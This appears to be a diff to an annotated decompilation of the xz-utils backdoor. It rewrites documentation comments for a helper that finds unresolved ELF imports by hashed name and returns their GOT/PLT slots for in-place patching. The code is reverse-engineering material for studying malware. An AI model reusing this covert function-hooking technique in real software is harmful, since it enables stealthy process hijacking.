@@ -5,9 +5,12 @@
 
 
 /*
- * AutoDoc: Generic helper that scans an arbitrary relocation array for undefined symbols of a specific relocation type (e.g., GOT vs PLT) and a specific encoded name. It iterates through `num_relocs`, ensures the relocation type matches `reloc_type`, confirms the associated symbol is really an import (`st_shndx == 0`), and then resolves the symbol name via `get_string_id` before comparing it to `encoded_string_id`. When it finds a match it returns the relocated address (`elfbase + r_offset`) so the caller can patch GOT/PLT entries in place.
- *
- * Each call starts by logging the lookup with `secret_data_append_from_address`, and it immediately aborts if the telemetry helper reports failure. That keeps relocation patching tied to the secret-data accounting path so the loader never quietly rewrites GOT/PLT entries when the recorder is disabled.
+ * AutoDoc: Generic helper that scans any relocation array for undefined symbols of a particular relocation type (e.g.,
+ * GOT vs. PLT) and encoded name. It walks `num_relocs`, enforces the requested `reloc_type`, confirms the symbol is
+ * really an import (`st_shndx == 0`), and hashes the name via `get_string_id` before comparing it to
+ * `encoded_string_id`. Matching entries return the relocated slot (`elfbase + r_offset`) so callers can patch GOT/PLT
+ * entries in place. Every lookup is gated by `secret_data_append_from_address` so relocation edits only happen while
+ * the secret-data recorder is active.
  */
 
 #include "xzre_types.h"
@@ -21,14 +24,17 @@ void * elf_get_reloc_symbol
   EncodedStringId sym_name_id;
   ulong reloc_index;
   
+  // AutoDoc: Relocation hunts stay tied to the secret-data log; skip the scan entirely when telemetry fails.
   telemetry_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x67,5,4);
   reloc_index = 0;
   if (telemetry_ok != FALSE) {
     for (; reloc_index < num_relocs; reloc_index = reloc_index + 1) {
+      // AutoDoc: Filter on the relocation type and insist the associated symbol is an unresolved import before hashing the name.
       if ((((relocs->r_info & 0xffffffff) == reloc_type) &&
           (elf_info->dynsym[relocs->r_info >> 0x20].st_shndx == 0)) &&
          (sym_name_id = get_string_id(elf_info->dynstr + elf_info->dynsym[relocs->r_info >> 0x20].st_name,
                                 (char *)0x0), sym_name_id == encoded_string_id)) {
+        // AutoDoc: Hand the caller the writable relocation slot (module base + `r_offset`) once a match is found.
         return elf_info->elfbase->e_ident + relocs->r_offset;
       }
       relocs = relocs + 1;
